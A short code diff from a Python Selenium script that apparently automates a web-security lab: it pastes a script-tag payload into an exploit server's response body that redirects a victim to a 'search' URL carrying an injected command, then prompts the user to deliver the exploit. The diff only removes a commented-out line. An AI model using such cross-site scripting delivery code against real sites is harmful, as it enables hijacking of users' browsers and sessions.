@@ -39,7 +39,6 @@ def write_body(url, command, hostname):
     driver = webdriver.Firefox()
     driver.get(hostname)
     textarea = driver.find_element(By.NAME, "responseBody")
-    #textarea.send_keys(command)
     textarea.send_keys("<script>location = '" + url + "/?search=" + command + "';</script>")
     print("Press the <Store> button and then the <Deliver exploit to victim> button")
 
